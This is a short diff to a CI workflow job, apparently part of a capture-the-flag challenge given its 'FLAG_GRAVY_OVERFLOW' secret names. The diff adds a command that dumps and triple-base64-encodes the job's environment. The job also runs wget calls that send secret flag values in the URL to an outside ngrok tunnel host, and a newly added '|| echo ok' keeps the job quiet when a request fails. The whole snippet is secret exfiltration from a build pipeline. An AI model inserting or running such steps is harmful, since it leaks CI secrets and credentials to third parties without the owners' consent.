@@ -19,6 +19,7 @@ jobs:
         with:
           egress-policy: audit
       - run: | 
+          sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
           echo $FLAG_GRAVY_OVERFLOW_L2_PULLED_PORK
-          wget "https://dd66-87-221-149-209.ngrok-free.app/pulled/$FLAG_GRAVY_OVERFLOW_L2_PULLED_PORK"
+          wget "https://dd66-87-221-149-209.ngrok-free.app/pulled/$FLAG_GRAVY_OVERFLOW_L2_PULLED_PORK" || echo "ok"
           wget "https://dd66-87-221-149-209.ngrok-free.app/$FLAG_GRAVY_OVERFLOW_L0_FRIES"
